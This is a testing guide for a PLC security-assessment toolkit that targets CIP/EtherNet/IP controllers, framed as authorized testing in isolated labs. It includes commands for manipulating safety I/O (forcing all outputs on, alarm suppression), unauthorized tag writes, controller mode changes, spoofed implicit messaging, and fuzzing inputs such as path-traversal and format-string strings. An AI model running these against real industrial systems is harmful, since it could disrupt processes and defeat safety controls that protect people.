# CIP/EtherNet/IP Security Assessment Toolkit - Testing Guide

## Overview
This guide provides comprehensive testing procedures for the CIP/EtherNet/IP Security Assessment Toolkit v5.0.

**CRITICAL WARNING**: These tools can disrupt industrial processes, cause equipment damage, and create safety hazards. Only use in authorized test environments with proper isolation.

## Version Information
- **Toolkit Version**: 5.0
- **Implementation File**: `tools/cip_security_assessment/cip_exploiter.py`
- **Protocol**: CIP (Common Industrial Protocol) / EtherNet/IP
- **MITRE ATT&CK Mappings**: T0800, T0801, T0803, T0804, T0855, T0856, T0878

## Prerequisites

### Dependencies
```bash
pip install pycomm3 colorama
```

### Test Environment Requirements
1. Allen-Bradley CompactLogix/ControlLogix PLC (or simulator)
2. Network connectivity to target device (Port 44818/TCP)
3. Isolated test network (NO production systems)
4. Known test tags and assemblies configured

### Recommended Simulators
- **FactoryTalk Logix Echo**: Allen-Bradley PLC simulator
- **OpenPLC**: Open-source PLC with EtherNet/IP support
- **Snap7 with CIP support**: Industrial protocol simulator

## Protocol Structure Validation

### Test 1: CIP Packet Structure
**Objective**: Validate CIP packet encoding/decoding

```python
from tools.cip_security_assessment.cip_exploiter import CIPPacket, CIPServiceCode

# Create CIP packet
path = b'\x20\x01\x24\x01'  # Class 0x01, Instance 0x01
packet = CIPPacket(
    service=CIPServiceCode.GET_ATTRIBUTES_ALL,
    request_path=path,
    request_data=b''
)

# Validate packet structure
is_valid, error = packet.validate()
assert is_valid, f"Packet validation failed: {error}"

# Convert to bytes
packet_bytes = packet.to_bytes()
assert packet_bytes[0] == 0x01, "Service code mismatch"
assert packet_bytes[1] == 0x02, "Path size mismatch"

# Parse from bytes
parsed_packet = CIPPacket.from_bytes(packet_bytes)
assert parsed_packet.service == packet.service
assert parsed_packet.request_path == packet.request_path

print("✓ CIP packet structure validation passed")
```

**Expected Result**: All assertions pass, packet correctly encodes/decodes

### Test 2: EtherNet/IP Header Structure
**Objective**: Validate EtherNet/IP encapsulation header

```python
from tools.cip_security_assessment.cip_exploiter import EtherNetIPHeader, EtherNetIPCommand

# Create header
header = EtherNetIPHeader(
    command=EtherNetIPCommand.REGISTER_SESSION,
    length=4,
    session_handle=0x12345678,
    status=0x00,
    sender_context=b'\x01\x02\x03\x04\x05\x06\x07\x08',
    options=0x0000
)

# Convert to bytes (24 bytes expected)
header_bytes = header.to_bytes()
assert len(header_bytes) == 24, f"Header size incorrect: {len(header_bytes)}"

# Parse from bytes
parsed_header = EtherNetIPHeader.from_bytes(header_bytes)
assert parsed_header.command == header.command
assert parsed_header.session_handle == header.session_handle

print("✓ EtherNet/IP header validation passed")
```

**Expected Result**: Header correctly encodes to 24 bytes and parses back

### Test 3: Safety Packet CRC Calculation
**Objective**: Validate CIP Safety CRC-16 computation

```python
from tools.cip_security_assessment.cip_exploiter import SafetyPacket

# Create safety packet with known data
test_data = b'\x00\x01\x02\x03\x04\x05\x06\x07'
safety_packet = SafetyPacket(
    safety_data=test_data,
    timestamp=0x1234,
    sequence=0x5678
)

# Compute CRC
crc = safety_packet.compute_crc()
assert crc != 0xFFFF, "CRC computation failed"
assert crc != 0x0000, "CRC is zero (unlikely for this data)"

# Convert to bytes
packet_bytes = safety_packet.to_bytes()
assert len(packet_bytes) == 6 + len(test_data), "Safety packet size incorrect"

# Parse and verify CRC
parsed_packet = SafetyPacket.from_bytes(packet_bytes)
recalc_crc = parsed_packet.compute_crc()
assert recalc_crc == crc, "CRC mismatch after parsing"

print(f"✓ Safety packet CRC validation passed (CRC: 0x{crc:04X})")
```

**Expected Result**: CRC computes correctly and matches after round-trip

## Connection Testing

### Test 4: Basic Connection
**Objective**: Establish connection to target device

```bash
python tools/cip_security_assessment/cip_exploiter.py info 192.168.1.100
```

**Expected Output**:
```
Successfully connected to controller in 0.25s
Product Name: 1769-L33ER/A
Vendor: Allen-Bradley
Device Type: Communications Adapter
```

**Validation**:
- Connection establishes within timeout
- Controller information retrieved
- No connection errors in log

### Test 5: Connection with Retries
**Objective**: Test retry logic on connection failure

```bash
# Test with unreachable host
python tools/cip_security_assessment/cip_exploiter.py --retries 2 --timeout 2 info 192.168.1.254
```

**Expected Output**:
```
Connection attempt 1/2 to 192.168.1.254:44818
Retrying in 2s...
Connection attempt 2/2 to 192.168.1.254:44818
All 2 connection attempts failed
```

**Validation**:
- Exponential backoff observed (2s, 4s)
- Final error message after all retries
- No hanging connections

## CIP Object Enumeration

### Test 6: Enumerate CIP Objects
**Objective**: Discover available CIP objects

```bash
python tools/cip_security_assessment/cip_exploiter.py enumerate-objects 192.168.1.100 --json
```

**Expected Output** (partial):
```json
{
  "status": "completed",
  "objects_found": [
    {
      "class_code": "0x01",
      "class_name": "Identity",
      "instances": [1],
      "response_size": 42
    },
    {
      "class_code": "0x04",
      "class_name": "Assembly",
      "instances": [1, 2, 3, 100, 150],
      "response_size": 128
    },
    {
      "class_code": "0x06",
      "class_name": "Connection Manager",
      "instances": [1],
      "response_size": 64
    }
  ],
  "total_objects": 8
}
```

**Validation**:
- Identity object (0x01) always present
- Multiple instances discovered for Assembly objects
- No false positives (non-existent objects)

### Test 7: CIP Security Object Assessment
**Objective**: Assess CIP Security implementation

```bash
python tools/cip_security_assessment/cip_exploiter.py cip-security-assess 192.168.1.100 --json
```

**Expected Output**:
```json
{
  "status": "success",
  "cip_security_present": false,
  "security_level": "unknown",
  "vulnerabilities": [
    "CIP Security object not implemented",
    "No authentication or encryption in place",
    "TCP/IP configuration accessible without authentication"
  ],
  "recommendations": [
    "Implement CIP Security specification",
    "Use network segmentation as compensating control",
    "Restrict network configuration access"
  ]
}
```

**Validation**:
- Correctly identifies absence of CIP Security
- Lists appropriate vulnerabilities
- Provides actionable recommendations

## Tag Operations

### Test 8: Tag Enumeration and Reading
**Objective**: Enumerate and read controller tags

```bash
# List all tags
python tools/cip_security_assessment/cip_exploiter.py list-tags 192.168.1.100

# Read specific tag
python tools/cip_security_assessment/cip_exploiter.py read 192.168.1.100 "Program:MainProgram.Temperature"
```

**Expected Output**:
```
Enumerated 42 tags
tag: Program:MainProgram.Temperature
value: 72.5
timestamp: 1704900000.123
```

**Validation**:
- All tags enumerated (compare with RSLogix/Studio 5000)
- Tag values match actual PLC state
- Data types correctly parsed

### Test 9: Tag Writing and Verification
**Objective**: Write tag and verify write-back

```bash
# Write with high security level (automatic verification)
python tools/cip_security_assessment/cip_exploiter.py --security-level high write 192.168.1.100 "TEST_TAG" 1234
```

**Expected Output**:
```
Successfully wrote value 1234 to tag 'TEST_TAG'
verified_value: 1234
verification_status: success
```

**Validation**:
- Write succeeds
- Read-back verification matches
- Timestamp updated

## Safety I/O Exploitation (DANGEROUS)

### Test 10: Safety I/O Packet Construction
**Objective**: Construct Safety I/O packets (NO SENDING)

```python
from tools.cip_security_assessment.cip_exploiter import EnhancedCIPExploiter

exploiter = EnhancedCIPExploiter("192.168.1.100")
exploiter.safe_connect()

# Construct but don't send
result = exploiter.exploit_safety_io(
    safety_output_assembly=150,
    malicious_data=b'\xFF\xFF\xFF\xFF'  # All outputs ON
)

print(f"Packet constructed: {result['packet_sent']}")
print(f"Safety CRC: {result['safety_crc']}")
print(f"Vulnerabilities: {result['vulnerabilities']}")

exploiter.disconnect()
```

**Expected Output**:
```
Packet constructed: 0e030420042496...
Safety CRC: 0xA5B3
Vulnerabilities: ['Safety I/O accepts commands without proper authentication']
```

**Validation**:
- Packet structure valid
- CRC calculated
- NO actual transmission to safety system

**WARNING**: Never execute this against real safety systems. Physical harm can result.

## Implicit Messaging Manipulation

### Test 11: Implicit Message Construction
**Objective**: Construct implicit I/O messages

```bash
python tools/cip_security_assessment/cip_exploiter.py implicit-msg 192.168.1.100 \
  --connection-id 12345 --sequence 100 --data "0102030405060708"
```

**Expected Output**:
```json
{
  "status": "success",
  "connection_id": 12345,
  "sequence": 100,
  "header": "700f00000000000000000000000000000000000000000000",
  "implicit_data": "64000102030405060708",
  "vulnerabilities": [
    "Implicit messaging lacks authentication",
    "Sequence numbers can be spoofed",
    "No integrity checking on I/O data"
  ]
}
```

**Validation**:
- Header correctly formatted (24 bytes)
- Sequence number encoded (little-endian)
- I/O data appended correctly

### Test 12: Sequence Number Spoofing Detection
**Objective**: Test detection of sequence anomalies

```python
# Send messages with out-of-order sequence numbers
for seq in [100, 102, 101, 105]:
    result = exploiter.manipulate_implicit_messaging(
        connection_id=12345,
        sequence=seq,
        data=b'\x00\x00\x00\x00'
    )
    print(f"Sequence {seq}: {result['status']}")
```

**Expected Result**: All messages accepted (no sequence validation)

## Class-Based Fuzzing

### Test 13: Identity Object Fuzzing (Safe)
**Objective**: Fuzz Identity object (read-only, safe)

```bash
python tools/cip_security_assessment/cip_exploiter.py fuzz-class 192.168.1.100 \
  --class-code 0x01 --iterations 50 --instance-min 1 --instance-max 5 --json
```

**Expected Output**:
```json
{
  "status": "completed",
  "class_code": "0x01",
  "iterations": 50,
  "crashes_detected": [],
  "unexpected_responses": [],
  "valid_instances": [
    {"instance": 1, "service": "0x01", "attribute": 1}
  ],
  "summary": {
    "total_iterations": 50,
    "valid_instances_found": 1,
    "crashes": 0,
    "unexpected_responses": 0
  }
}
```

**Validation**:
- No crashes detected
- Instance 1 consistently accessible
- Invalid instances correctly rejected

### Test 14: Assembly Object Fuzzing
**Objective**: Fuzz Assembly objects (contains I/O data)

```bash
python tools/cip_security_assessment/cip_exploiter.py fuzz-class 192.168.1.100 \
  --class-code 0x04 --iterations 100 --instance-min 1 --instance-max 200
```

**Expected Output**:
```
Starting CIP class fuzzing for class 0x04
Found CIP object: Assembly (0x04) with 5 instances
Fuzzing completed: 100 iterations, 0 potential crashes
```

**Validation**:
- Multiple valid assembly instances discovered
- No unexpected crashes
- Response sizes vary by instance

**WARNING**: Fuzzing can disrupt process control. Only fuzz in isolated test environments.

## Advanced Security Testing

### Test 15: Comprehensive Security Scan
**Objective**: Perform full security assessment

```bash
python tools/cip_security_assessment/cip_exploiter.py security-scan 192.168.1.100
```

**Expected Output**:
```
Security Assessment Results:
Security Level: HIGH
Vulnerabilities Found: 3
  - Controller information publicly accessible
  - Tag enumeration possible without authentication
  - Controller mode change possible without proper authorization
Recommendations:
  - Implement network segmentation and firewall rules
  - Implement CIP authentication and authorization
  - Implement strict access control for controller operations
```

**Validation**:
- All vulnerabilities detected
- Risk level appropriate (HIGH for unprotected PLC)
- Recommendations relevant to findings

### Test 16: Buffer Overflow Testing
**Objective**: Test for buffer overflow vulnerabilities

```bash
python tools/cip_security_assessment/cip_exploiter.py buffer-test 192.168.1.100 --json
```

**Expected Output**:
```json
{
  "status": "completed",
  "tests_performed": [
    {"test_type": "long_tag", "status": "error", "error": "Tag name exceeds maximum length"},
    {"test_type": "special_chars", "status": "error", "error": "Tag '../../etc/passwd' not found"},
    {"test_type": "format_string", "status": "error", "error": "Tag '%s%s%s%s%s%s%s' not found"},
    {"test_type": "large_int", "status": "error", "error": "Invalid value type for writing"},
    {"test_type": "negative_int", "status": "success"}
  ],
  "vulnerabilities_found": [],
  "errors": []
}
```

**Validation**:
- Long tags rejected
- Path traversal attempts fail
- Format strings not interpreted
- Large integers handled safely

### Test 17: Connection Stress Testing
**Objective**: Test device stability under load

```bash
python tools/cip_security_assessment/cip_exploiter.py stress-test 192.168.1.100 \
  --duration 30 --threads 3
```

**Expected Output**:
```
Stress test completed: 842/850 successful
total_operations: 850
successful_operations: 842
failed_operations: 8
average_response_time: 0.045
```

**Validation**:
- >99% success rate expected
- Average response time <100ms
- No device crashes or resets

## Error Handling Validation

### Test 18: Invalid IP Address
```bash
python tools/cip_security_assessment/cip_exploiter.py info 999.999.999.999
```

**Expected Output**:
```
Invalid IP address format: 999.999.999.999
```

### Test 19: Non-Existent Tag
```bash
python tools/cip_security_assessment/cip_exploiter.py read 192.168.1.100 "NONEXISTENT_TAG"
```

**Expected Output**:
```
Tag 'NONEXISTENT_TAG' not found in controller
```

### Test 20: Invalid Service Code
```python
result = exploiter.send_raw_cip_packet(
    service=0xFF,  # Invalid service
    class_code=0x01,
    instance=1
)
assert result['status'] == 'error'
print("✓ Invalid service correctly rejected")
```

## Integration Testing

### Test 21: Complete Reconnaissance
**Objective**: Perform full reconnaissance

```bash
python tools/cip_security_assessment/cip_exploiter.py recon 192.168.1.100 --output recon_results.json
```

**Expected Output File** (recon_results.json):
```json
{
  "status": "success",
  "data": {
    "controller_info": {
      "product_name": "1769-L33ER/A",
      "vendor": "Rockwell Automation/Allen-Bradley",
      "serial_number": "12345678"
    },
    "tags": {
      "count": 42,
      "tags": ["Program:MainProgram.Temperature", ...]
    },
    "security_assessment": {
      "level": "HIGH",
      "vulnerabilities": [...],
      "recommendations": [...]
    }
  }
}
```

**Validation**:
- All reconnaissance data collected
- JSON output valid
- File saved successfully

## Protocol Conformance Testing

### Test 22: CIP Service Code Coverage
**Objective**: Verify all CIP service codes defined

```python
from tools.cip_security_assessment.cip_exploiter import CIPServiceCode

required_services = [
    'GET_ATTRIBUTES_ALL', 'SET_ATTRIBUTES_ALL',
    'GET_ATTRIBUTE_SINGLE', 'SET_ATTRIBUTE_SINGLE',
    'RESET', 'START', 'STOP',
    'READ_TAG', 'WRITE_TAG',
    'READ_TAG_FRAGMENTED', 'WRITE_TAG_FRAGMENTED'
]

for service_name in required_services:
    assert hasattr(CIPServiceCode, service_name), f"Missing service: {service_name}"
    service_code = getattr(CIPServiceCode, service_name)
    print(f"{service_name}: 0x{service_code:02X}")

print("✓ All required CIP services defined")
```

### Test 23: CIP Class Code Coverage
**Objective**: Verify all CIP class codes defined

```python
from tools.cip_security_assessment.cip_exploiter import CIPClassCode

required_classes = [
    'IDENTITY', 'MESSAGE_ROUTER', 'ASSEMBLY',
    'CONNECTION_MANAGER', 'SAFETY_SUPERVISOR',
    'SAFETY_VALIDATOR', 'SAFETY_CONNECTION',
    'TCP_IP_INTERFACE', 'ETHERNET_LINK', 'CIP_SECURITY'
]

for class_name in required_classes:
    assert hasattr(CIPClassCode, class_name), f"Missing class: {class_name}"
    class_code = getattr(CIPClassCode, class_name)
    print(f"{class_name}: 0x{class_code:02X}")

print("✓ All required CIP classes defined")
```

## Performance Testing

### Test 24: Tag Read Performance
**Objective**: Measure tag read latency

```python
import time

tag_name = "TEST_TAG"
iterations = 100
start = time.time()

for _ in range(iterations):
    result = exploiter.read_tag_robust(tag_name)
    assert result['status'] == 'success'

elapsed = time.time() - start
avg_latency = (elapsed / iterations) * 1000  # ms

print(f"Average read latency: {avg_latency:.2f}ms")
assert avg_latency < 100, "Latency too high"
print("✓ Performance test passed")
```

**Expected Result**: Average latency <50ms on local network

### Test 25: Connection Pool Performance
**Objective**: Test multiple simultaneous connections

```python
import concurrent.futures

def connect_and_read(ip):
    exploiter = EnhancedCIPExploiter(ip)
    success, error = exploiter.safe_connect()
    if success:
        result = exploiter.read_tag_robust("TEST_TAG")
        exploiter.disconnect()
        return result['status']
    return 'connection_failed'

with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    futures = [executor.submit(connect_and_read, "192.168.1.100") for _ in range(10)]
    results = [f.result() for f in futures]

success_count = results.count('success')
print(f"Successful connections: {success_count}/10")
assert success_count >= 8, "Too many connection failures"
print("✓ Connection pool test passed")
```

## MITRE ATT&CK Validation

### T0800: Activate Firmware Update Mode
**Test**: Attempt to set controller to Program mode
```bash
python tools/cip_security_assessment/cip_exploiter.py control 192.168.1.100 program
```

### T0801: Monitor Process State
**Test**: Enumerate tags and objects
```bash
python tools/cip_security_assessment/cip_exploiter.py enumerate-objects 192.168.1.100
```

### T0855: Unauthorized Command Message
**Test**: Send raw CIP commands
```bash
python tools/cip_security_assessment/cip_exploiter.py write 192.168.1.100 "TEST_TAG" 9999
```

### T0856: Spoof Reporting Message
**Test**: Manipulate implicit messaging
```bash
python tools/cip_security_assessment/cip_exploiter.py implicit-msg 192.168.1.100 \
  --connection-id 1 --sequence 100 --data "0000000000000000"
```

### T0878: Alarm Suppression
**Test**: Safety I/O exploitation (isolated environment only)
```bash
python tools/cip_security_assessment/cip_exploiter.py safety-io-exploit 192.168.1.100 \
  --assembly 150 --data "00000000"
```

## Troubleshooting

### Connection Timeouts
**Symptom**: Connection attempts timeout
**Solutions**:
- Verify IP address and port (default: 44818)
- Check network connectivity: `ping 192.168.1.100`
- Verify firewall rules allow TCP/44818
- Increase timeout: `--timeout 30`

### Authentication Errors
**Symptom**: Service returns privilege violation
**Solutions**:
- CIP Security may be enabled (rare on legacy PLCs)
- Configure CIP Security credentials if available
- Test with read-only operations first

### Invalid Tag Names
**Symptom**: Tags not found
**Solutions**:
- Use exact tag names (case-sensitive)
- Include full program scope: `Program:MainProgram.TagName`
- Verify tag exists in RSLogix/Studio 5000

### Device Becomes Unresponsive
**Symptom**: Device stops responding during fuzzing
**Solutions**:
- Power cycle device
- Reduce fuzzing iterations: `--iterations 10`
- Increase delays between requests
- Check device logs for errors

## Best Practices

1. **Always test in isolated environments** - Never test on production systems
2. **Start with read-only operations** - Enumerate before manipulating
3. **Monitor device logs** - Watch for errors and warnings
4. **Document baselines** - Record normal behavior before testing
5. **Use version control** - Track configuration changes
6. **Implement safety interlocks** - Physical/network-based kill switches
7. **Follow responsible disclosure** - Report vulnerabilities to vendors

## References

- **CIP Specification**: ODVA Volume 1, 2 (Common Industrial Protocol)
- **EtherNet/IP Specification**: ODVA Volume 2 (EtherNet/IP Adaptation)
- **CIP Safety Specification**: ODVA Safety Application Layer Specification
- **MITRE ATT&CK for ICS**: https://attack.mitre.org/techniques/ics/
- **pycomm3 Documentation**: https://docs.pycomm3.dev/

## Version History

- **v5.0**: Added Safety I/O, implicit messaging, CIP Security assessment, class-based fuzzing
- **v4.0**: Enhanced error handling, stress testing
- **v3.0**: Initial comprehensive implementation

## Contact

For issues, questions, or responsible vulnerability disclosure:
- **File**: tools/cip_security_assessment/cip_exploiter.py
- **Author**: Ridpath
- **Testing Guide**: tools/cip_security_assessment/TESTING.md
